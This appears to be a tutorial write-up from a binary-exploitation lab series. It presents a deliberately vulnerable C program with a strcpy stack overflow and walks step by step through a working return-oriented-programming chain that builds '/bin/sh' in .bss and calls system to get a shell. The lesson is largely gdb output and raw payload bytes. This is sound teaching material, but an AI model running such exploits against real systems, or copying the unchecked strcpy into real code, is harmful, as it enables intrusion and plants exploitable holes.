@@ -1,0 +1,158 @@
+# Follow the Yellow Brick Functions
+
+In this problem, I smartened up. Nowhere in the binary will you find `"/bin/sh"`
+
+```C
+# include<stdio.h>
+# include<string.h>
+int main(int argc, char **argv) {
+    putenv("PATH=");
+    printf("I've broken up my system call!\n");
+    printf("You think I've included what you need for this? You wish\n");
+    char user_buf[64]= "";
+    if (argc > 1) {
+        strcpy(user_buf,argv[1]);
+    }
+    else {
+        printf("usage: ./overflow [input]\n");
+        return 0;
+        }
+    char buf1[10] = "/b";
+    char buf2[8] = "in/";
+    char buf3[5] = "date";
+    strcat(buf2,buf3);
+    strcat(buf1,buf2);
+    system(buf1);
+    printf("Aren't these string functions wonderful?\n");
+    return 0;
+}
+```
+
+As you'll remember from the previous exercise, putting `"/bin/sh"` in the binary was a mistake. This problem is geared very similarly with a little bit of extra finesse. First things first, we'll find the offset of `%eip`
+
+```gdb
+$ strace ./overflow $(python -c 'print "A"*76 + "BBBB"')
+...
+--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x42424242} ---
+```
+
+After 76 bytes we have `%eip`! From here we have to get a bit clever. If you take anything from this exercise, it's this: **If a function is in the binary an PIE is not enabled, you have access to the function.** This means we can access to the `strcat()` and `strcpy()` functions. We can use these to cleverly get ourselves a shell.
+
+Now, for a quick introduction to the `.bss` segment. `.bss` refers to the part of data memory used by many compilers and linkers for holding statically-allocated variables that are not explicitly initialized to any value. Regardless of what the program uses the `.bss` segment for, know that it's a scratch pad for hackers. We can use it to reliably store data when the stack is randomized. We could use the GOT, but it might mess up functions we need. Knowing this, how can we get a shell?
+
+The answer lies in the functions used. We have the strings `"/b"` and `"in/"` in the binary. We also have `"sh"` at the end of the second print statement! :D
+
+Let's use `objdump` to get some function addresses:
+
+```objdump
+$ objdump -d overflow | grep ">:"
+...
+08048370 <strcat@plt>:
+08048380 <strcpy@plt>:
+...
+080483a0 <system@plt>:
+```
+
+Next, we will need to find the start of the `.bss` segment:
+
+```gdb
+$ gdb -q ./overflow
+Reading symbols from ./overflow...(no debugging symbols found)...done.
+gdb-peda$ info address __bss_start
+Symbol "__bss_start" is at 0x804a030 in a file compiled without debugging.
+```
+
+Now our exploit (abstractly) is as follows:
+
+```c
+strcpy(&bss, &"/b" );
+strcat(&bss, &"in/");
+strcat(&bss,&"sh");
+system(&bss)
+```
+
+We'll need the addresses of strings in the binary:
+
+```gdb
+$ gdb -q ./overflow
+Reading symbols from ./overflow...(no debugging symbols found)...done.
+gdb-peda$ b*main
+Breakpoint 1 at 0x80484dd
+gdb-peda$ r
+Starting program: /vagrant/how2exploit_binary/overflow-3/overflow
+Breakpoint 1, 0x080484dd in main ()
+gdb-peda$ find "/b" binary
+Searching for '/b' in: binary ranges
+Found 2 results, display max 2 items:
+overflow : 0x804854e (<main+113>:   das)
+overflow : 0x804954e --> 0x622f ('/b')
+gdb-peda$ find "in/" binary
+Searching for 'in/' in: binary ranges
+Found 2 results, display max 2 items:
+overflow : 0x8048565 (<main+136>:   imul   $0x2444c700,0x2f(%esi),%ebp)
+overflow : 0x8049565 --> 0x2f6e69 ('in/')
+gdb-peda$ find "sh" binary
+Searching for 'sh' in: binary ranges
+Found 2 results, display max 2 items:
+overflow : 0x80486ce --> 0x75006873 ('sh')
+overflow : 0x80496ce --> 0x75006873 ('sh')
+```
+
+Now that we have everything we need, we can learn one more important concept: Chaining Functions. If you only need to call one function to get a shell, you don't need to chain. Otherwise, we need to chain functions.
+
+In order to chain functions together we need to somehow remove the arguments from the stack. As you know from before, standard x86 function calls look like:
+
+\[function address\] \[return address\] \[arg1\] \[arg2\] ...
+
+The first function will run, then the return address, then the program will SEGFAULT when it tries to run the argument as code. We can't have the program trying to run our arguments, so we need to pop them off of the stack.
+
+This requires the use of Return Oriented Programming, or a ROP exploit. ROP uses any set of instructions in a binary that ends with a `ret` instruction. In order to find these, you can use `ropshell.com`, `gdb-peda`, or `ROPgadget`. We need a `pop;pop;ret` gadget since we need to pop two arguments off of the stack for every function call except system. Since system is our last call, we don't need a `pop;ret` gadget for it.
+
+I'm using `gdb-peda` in this example.
+
+```gdb
+$ gdb -q ./overflow
+Reading symbols from ./overflow...(no debugging symbols found)...done.
+gdb-peda$ b*main
+Breakpoint 1 at 0x80484dd
+gdb-peda$ r
+Starting program: /vagrant/how2exploit_binary/overflow-3/overflow
+...
+Breakpoint 1, 0x080484dd in main ()
+gdb-peda$ ropsearch "" binary
+Searching for ROP gadget: '' in: binary ranges
+...
+0x0804863e : (b'5f5dc3')    pop %edi; pop %ebp; ret
+```
+
+Luckily for us, the binary has the gadget we need! Chaining functions will take
+this form in our exploit (and future ones, too!)
+
+\[&function\] \[&rop_gadget\] \[&arg1\] \[&arg2\] \[&next_function\]
+
+You can use any number of arguments as long as you have a rop gadget with the same number of pops.
+
+Let's give the exploit a try:
+
+```
+/overflow $(python -c 'print "A"*76 +
+"\x80\x83\x04\x08" + "\x3e\x86\x04\x08" + "\x30\xa0\x04\x08" +
+"\x4e\x95\x04\x08" + "\x70\x83\x04\x08" + "\x3e\x86\x04\x08" +
+"\x30\xa0\x04\x08" + "\x65\x95\x04\x08" + "\x70\x83\x04\x08" +
+"\x3e\x86\x04\x08" + "\x30\xa0\x04\x08" + "\xce\x96\x04\x08" +
+"\xa0\x83\x04\x08" + "FAKE" + "\x30\xa0\x04\x08"')
+```
+
+The layout of the exploit looks like the following:
+
+```
+<overflow> +
+<strcpy> + <pop pop ret> + <bss_start>
+<"/b"> + <strcat> + <pop pop ret>
+<bss_start> + <"/in"> + <strcat>
+<pop pop ret> + <bss_start> + <"sh">
+<system> + <FAKE> + <bss_start>
+```
+
+
+You should get a shell, although you won't be able to do much as we didn't set privs. The concept, however, still stands.
